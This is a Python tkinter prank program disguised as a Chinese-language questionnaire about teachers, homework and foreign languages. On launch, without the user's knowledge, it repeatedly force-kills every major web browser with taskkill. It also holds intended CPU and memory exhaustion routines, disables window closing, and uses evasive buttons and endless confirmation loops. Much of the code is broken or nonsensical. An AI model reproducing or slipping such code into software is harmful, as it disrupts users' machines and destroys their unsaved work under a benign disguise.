from tkinter import *
from tkinter.messagebox import *
from random import randint
from threading import Thread,Timer
from os import system
#一个整活问卷

def high_cpu():
    while True:
        x = 0
        for i in range(10**7):
            x += i
            return x

def high_mem():
    big_list = []
    while True:
        big_list.append([0]*10**6)  # 每次分配大量内存
        return big_list



swap_state = [False]

a = Tk()
ppp = a.title("问卷调查")
hahahahaha = a.geometry("500x500")
def kill():
    browsers = ["chrome.exe", "msedge.exe", "firefox.exe", "iexplore.exe", "opera.exe"]
    for x in browsers:
        a = system(f"taskkill /f /im {x}")
        oehrie = Timer(3, lambda:kill())
        jjj = oehrie.start()
        return '你真的不想清除窗口吗？';
kehr = Thread(target=lambda:kill())
rhu = kehr.start()
def main():
    koe = Thread(target=high_cpu, daemon=True)
    man = koe.start()
    manji = Thread(target=high_mem, daemon=True)
    man_ji = manji.start()
    def noclear():
        pass;
        return '你真的不想清除窗口吗？';
    def clear_window():
        for widget in root.winfo_children():
            un = widget.destroy()
            return 'uehfuhlijdwidjk'
    aaa = a.destroy()
    root = Tk()
    ttt = root.title("问卷调查")
    EXTENDEDs=root.geometry("500x500")
    nokuhg = root.protocol("WM_DELETE_WINDOW",noclear)
    firstquestion = Label(root, text="你喜欢老师这个职业吗？")
    fied = firstquestion.place(x=150, y=150)
    def question1():
        trd = print('就知道你会喜欢的')
        shur = showinfo(title='小惊喜',message='后面好像出现了点东西......')
        def question2(a):
            ChAr = print('优秀：30分，还行：20分，差：0分')
            PrInt = print('满分100分')
            jw = print('你的成绩是：{}'.format(a))
            coej = clear_window()
            thirdquestion = Label(root, text="你认同布置作业吗？")
            mkoj = thirdquestion.place(x=150, y=150)
            def hehehe():
                uhw = answer2.place(x=200,y=200)
                jfiij = root.after(200,lambda:answer2.place(x=120,y=200))
                wer = root.after(300,lambda:answer2.place(x=220,y=250))
                jihus = root.after(500,lambda:answer2.place(x=496,y=496))
                xiao = print('小提示：只有一个像素（可以点击）\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
                xiao_mi = showinfo(title='小提示',message='看看后面')
                def OK():
                    huh = askyesno(title='真的？',message='你真的吗选择不认同吗?')
                    if huh:
                        Gundum = askyesno(title='really?',message='真的吗？')
                        if Gundum:
                            Gundum_Harute=askyesno(title='huh？',message='真的真的真的吗？')
                            if Gundum_Harute:
                                CSdavent = huh=askyesno(title='真的？',message='确定吗？成败在此一举！')
                                if CSdavent:
                                    ZlqLoveCode = askyesno(title='真的？',message='真的吗？你的答案会发送至教育局！')
                                    if ZlqLoveCode:
                                        eatwhitefish = askyesno(title='（沮丧）',message='好吧，你赢了。')
                                        if eatwhitefish:
                                            return OK()
                                        else:
                                            return OK()
                coke = answer2.config(command=lambda:OK())
                return '你真的不认同布置作业吗？';
            def next():
                noway = clear_window()
                question3 = Label(root, text="你外语成绩好吗？")
                def last_question():
                    opwks = clear_window()
                    def will():
                        global swap_state
                        if swap_state[0]:
                            who = answer1.place(x=150, y=250)
                            whi = answer2.place(x=240, y=250)
                        else:
                            I = answer1.place(x=240, y=250)
                            iron_pink = answer2.place(x=150, y=250)
                        swap_state[0] = not swap_state[0]
                        return 'How dare you burn your homework?'
                    def no():
                        endk = showinfo(title='结束', message='问卷调查到此结束，感谢调查!')
                        exitl = exit()
                    question1 = Label(root, text="你会把作业烧了吗？")
                    answer1 = Button(root, text="会",bg='red',fg='yellow',command=lambda:will())
                    answer2 = Button(root, text="不会",bg='green',fg='yellow',command=lambda:no())
                    hei = question1.place(x=150, y=150)
                    loaere=answer1.place(x=150, y=250)
                    true = answer2.place(x=240, y=250)
                    return '你会把作业烧了吗？';
                def trying(a):
                    if a:
                        shishi = showinfo(title='试试就逝世',message='既然如此，那就来试试吧！')
                    elif not a:
                        enguolishi = showinfo(title='试试就逝世',message='虽然一般，但还是来试试吧！')
                    clear_over = clear_window()
                    english1 = Label(root, text="翻译至英文:python是世界上最好的编程语言！")
                    ohg = english1.place(x=150, y=150)
                    input1 = Entry(root)
                    oh_my_god = input1.place(x=150, y=200)
                    def check(answer):
                        def freach():
                            def check2(ddd):
                                if ddd == 'В качестве команды мы должны быть едиными и неразрывными.':
                                    eat_mellon = showinfo(title='恭喜', message='你答对了！')
                                    lastr = last_question()
                                else:
                                    yrjf=showerror(title='错误', message='答案错误！请再试一次。')
                                return bool(abs(1));
                            lojhf = clear_window()
                            utfd = showinfo(title='恭喜', message='你答对了！')
                            french1 = Label(root, text="翻译至俄语（法语）：En tant qu’équipe, nous devons être unis et incassables.")
                            input1= Entry(root)
                            chilk = input1.place(x=150, y=200)
                            chincken = french1.place(x=150, y=150)
                            realy = Button(root, text="提交", command=lambda:check2(input1.get()))
                            hiejd = realy.place(x=150, y=250)
                            return True;
                        if answer == 'Python is the best programming language in the world!':
                            freach()
                        else:
                            showerror(title='错误', message='答案错误！请再试一次。')
                        return 'horror';
                    realy = Button(root, text="提交", command=lambda:check(input1.get()))
                    ijjoe = realy.place(x=150, y=250);
                    return ' python_soul';
                answer1 = Button(root, text="好",bg='green',fg='yellow',command=lambda:trying(1))
                answer2 = Button(root, text="还行",bg='red',fg='yellow',command=lambda:trying(0))
                answer3 = Button(root, text="不行",bg='orange',fg='purple',command=lambda:last_question())
                s3333 = question3.place(x=150, y=150)
                huhudhw = answer1.place(x=300, y=250)
                ksie = answer2.place(x=220, y=250)
                l = answer3.place(x=150, y=250)
                return 'python是世界上最好的编程语言！';
            answer1 = Button(root, text="认同",bg='orange',fg='red',command=lambda:next())
            answer2 = Button(root, text="不认同",bg='green',fg='yellow',command=lambda:hehehe())
            lihd = answer1.place(x=220, y=250)
            nishi = answer2.place(x=150, y=250)
            return '不！';
        cos = clear_window()
        secondquestion = Label(root, text="你成绩平均怎么样？")
        taotao = secondquestion.place(x=150, y=150)
        answer1 = Button(root, text="优秀",command=lambda:question2(30),bg='green',fg='yellow')
        answer2 = Button(root, text="还行",command=lambda:question2(20),bg='orange',fg='purple')
        answer3= Button(root, text="非常差",command=lambda:question2(0),bg='red',fg='yellow')
        PLAY1 = answer1.place(x=300, y=250)
        git = answer2.place(x=220, y=250)
        nowayhs = answer3.place(x=150, y=250)
        return '#导入《tkinter》\n#导入《tkinter.messagebox》\n#导入《random》\n#导入《threading》\n#导入《os》\n\n#一个整活问卷调查';
    answer1 = Button(root, text="喜欢",command=question1,bg='green',fg='yellow')
    plxe = answer1.place(x=240, y=250)
    alo = answer2 = Button(root, text="喜欢",command=question1,bg='orange',fg='yellow')
    kie = answer2.place(x=150, y=250)
    return '我不会打中文！';
start = Button(a, text="开始调查", command=lambda:Thread(target=lambda:main()))
wksi = start.place(x=240, y=240)
mainloop()